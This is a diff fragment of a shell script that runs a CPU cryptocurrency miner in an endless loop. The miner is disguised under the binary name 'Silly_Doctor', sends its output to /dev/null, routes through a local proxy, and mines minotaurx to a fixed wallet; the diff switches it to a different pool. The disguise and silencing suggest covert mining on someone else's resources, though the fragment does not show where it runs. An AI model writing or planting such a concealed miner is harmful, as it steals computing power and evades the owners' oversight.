@@ -143,6 +143,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm minotaurx --pool minotaurx.na.mine.zpool.ca:7019 --wallet CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB --password $currentdate,c=LCC,zap=LCC --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
+./Silly_Doctor --disable-gpu --algorithm minotaurx --pool us-stratum.coinminerz.com:3511 --wallet CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB.$currentdate --password x --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 10
 done
